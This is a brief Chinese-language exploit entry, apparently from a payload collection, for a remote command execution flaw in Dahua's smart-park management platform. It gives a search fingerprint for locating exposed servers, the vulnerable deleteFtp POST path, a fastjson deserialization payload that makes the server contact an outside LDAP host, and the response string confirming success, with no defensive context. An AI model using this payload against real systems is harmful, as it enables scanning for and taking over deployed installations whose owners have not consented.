# 大华智慧园区综合管理平台deleteFtp接口远程命令执行漏洞

大华 ｜ 命令执行 ｜ —
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1`

**Payload**
```
{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://www.baidu.com","autoCommit":true}}}
```
- **响应特征**：200 autoCommit